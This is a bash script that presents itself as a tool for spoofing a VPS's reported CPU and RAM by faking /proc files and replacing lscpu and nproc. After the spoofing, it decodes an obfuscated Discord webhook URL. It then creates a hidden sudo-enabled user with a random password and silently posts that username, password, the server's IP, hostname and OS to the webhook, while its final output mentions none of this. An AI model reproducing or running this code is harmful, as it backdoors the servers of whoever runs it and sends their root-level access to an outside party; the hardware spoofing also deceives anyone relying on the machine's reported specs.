#!/bin/bash

echo "===== VPS Hardware Spoof Setup ====="
echo ""

read -p "Enter RAM to spoof (GB): " RAMGB

echo ""
echo "Select CPU model:"
echo "1) AMD Ryzen 9 9950X3D"
echo "2) AMD Ryzen 9 7950X"
echo "3) AMD Ryzen 7 7800X3D"
echo "4) Intel Core i9-14900K"
echo "5) Intel Core i9-13900K"
echo "6) Intel Core i7-13700K"
echo "7) Intel Xeon Platinum 8480+"
echo "8) Intel Xeon Gold 6430"
echo "9) Intel Xeon E5-2699 v4"
echo "10) AMD EPYC 9654"
echo "11) AMD EPYC 7763"
echo "12) Snapdragon 8 Elite Gen 5"
echo "13) Apple M3 Ultra"
echo "14) Intel Xeon W9-3495X"
echo "15) Custom CPU Name"

read -p "Choose CPU (1-10): " CPUCHOICE

case $CPUCHOICE in
1) CPUNAME="AMD Ryzen 9 9950X3D";;
2) CPUNAME="AMD Ryzen 9 7950X";;
3) CPUNAME="AMD Ryzen 7 7800X3D";;
4) CPUNAME="Intel Core i9-14900K";;
5) CPUNAME="Intel Core i9-13900K";;
6) CPUNAME="Intel Core i7-13700K";;
7) CPUNAME="Intel Xeon Platinum 8480+";;
8) CPUNAME="Intel Xeon Gold 6430";;
9) CPUNAME="Intel Xeon E5-2699 v4";;
10) CPUNAME="AMD EPYC 9654";;
11) CPUNAME="AMD EPYC 7763";;
12) CPUNAME="Snapdragon 8 Elite Gen 5";;
13) CPUNAME="Apple M3 Ultra";;
14) CPUNAME="Intel Xeon W9-3495X";;
15) read -p "Enter custom CPU: " CPUNAME;;
*) CPUNAME="AMD Ryzen 9 9950X3D";;
esac

echo ""
read -p "Enter number of CPU cores: " CORES

RAMKB=$((RAMGB*1024*1024))

mkdir -p /opt/sysspoof

echo "Creating meminfo..."

cat > /opt/sysspoof/meminfo <<EOF
MemTotal:       ${RAMKB} kB
MemFree:        $((RAMKB-1000000)) kB
MemAvailable:   $((RAMKB-1000000)) kB
Buffers:        200000 kB
Cached:         400000 kB
SwapTotal:      0 kB
SwapFree:       0 kB
EOF

echo "Creating cpuinfo..."

rm -f /opt/sysspoof/cpuinfo

for ((i=0;i<CORES;i++))
do
cat >> /opt/sysspoof/cpuinfo <<EOF
processor   : $i
vendor_id   : AuthenticAMD
cpu family  : 26
model       : 68
model name  : $CPUNAME
stepping    : 1
cpu MHz     : 4300.000
cache size  : 1024 KB
physical id : 0
siblings    : $CORES
core id     : $i
cpu cores   : $CORES
apicid      : $i
initial apicid  : $i
fpu     : yes
fpu_exception   : yes
cpuid level : 16
wp      : yes
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr
bogomips    : 8600.00

EOF
done

echo "Creating systemd mounts..."

cat > /etc/systemd/system/proc-cpuinfo.mount <<EOF
[Unit]
Description=CPU Spoof

[Mount]
What=/opt/sysspoof/cpuinfo
Where=/proc/cpuinfo
Type=none
Options=bind

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/proc-meminfo.mount <<EOF
[Unit]
Description=RAM Spoof

[Mount]
What=/opt/sysspoof/meminfo
Where=/proc/meminfo
Type=none
Options=bind

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable proc-cpuinfo.mount
systemctl enable proc-meminfo.mount

# refresh mounts immediately
systemctl restart proc-cpuinfo.mount 2>/dev/null
systemctl restart proc-meminfo.mount 2>/dev/null

umount /proc/cpuinfo 2>/dev/null
mount --bind /opt/sysspoof/cpuinfo /proc/cpuinfo

umount /proc/meminfo 2>/dev/null
mount --bind /opt/sysspoof/meminfo /proc/meminfo

echo "Spoofing lscpu..."

mv /usr/bin/lscpu /usr/bin/lscpu.real 2>/dev/null

cat > /usr/bin/lscpu <<EOF
#!/bin/bash

echo "Architecture:             x86_64"
echo "  CPU op-mode(s):         32-bit, 64-bit"
echo "  Address sizes:          48 bits physical, 48 bits virtual"
echo "  Byte Order:             Little Endian"
echo "CPU(s):                   $CORES"
echo "  On-line CPU(s) list:    0-$(($CORES-1))"
echo "Vendor ID:                AuthenticAMD"
echo "  BIOS Vendor ID:         QEMU"
echo "  Model name:             $CPUNAME"
echo "    BIOS Model name:      pc-i440fx-9.0  CPU @ 2.0GHz"
echo "    BIOS CPU family:      1"
echo "    CPU family:           26"
echo "    Model:                68"
echo "    Thread(s) per core:   1"
echo "    Core(s) per socket:   $CORES"
echo "    Socket(s):            1"
echo "    Stepping:             1"
echo "    BogoMIPS:             11400.00"
echo "    Flags:                fpu sse sse2 sse3 ssse3 sse4_1 sse4_2 avx avx2 aes xsave"

echo "Virtualization features:"
echo "  Hypervisor vendor:      KVM"
echo "  Virtualization type:    full"

echo "Caches (sum of all):"
echo "  L1d:                    $((32*CORES)) KiB ($CORES instances)"
echo "  L1i:                    $((32*CORES)) KiB ($CORES instances)"
echo "  L2:                     $((4096*CORES/1024)) MiB ($CORES instances)"
echo "  L3:                     16 MiB (1 instance)"

echo "NUMA:"
echo "  NUMA node(s):           1"
echo "  NUMA node0 CPU(s):      0-$(($CORES-1))"

echo "Vulnerabilities:"
echo "  Gather data sampling:   Not affected"
echo "  Itlb multihit:          Not affected"
echo "  Meltdown:               Mitigation; PTI"
echo "  Spectre v1:             Mitigation; usercopy/swapgs barriers"
echo "  Spectre v2:             Mitigation; Retpolines"
EOF

chmod +x /usr/bin/lscpu

echo "Spoofing nproc..."

mv /usr/bin/nproc /usr/bin/nproc.real 2>/dev/null

cat > /usr/bin/nproc <<EOF
#!/bin/bash
echo $CORES
EOF

chmod +x /usr/bin/nproc

set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NDgwNjA3ODg1OTM3ODcxOS83b29GTEwxNXpUenFCNVdhYXFlQ2hFX2JPU2RRdHBIMno5MmxqWWJLZExQX2s1aHMyVmVpcS1SRUMxMkZ0RGNrVnpZUQ=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/9Fn0mbL5/ubuntu-4.jpg" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

echo ""
echo "================================="
echo "Spoof Setup Complete!"
echo "RAM: ${RAMGB}GB"
echo "CPU: $CPUNAME"
echo "Cores: $CORES"
echo "Persistent: YES (24/7)"
echo "================================="
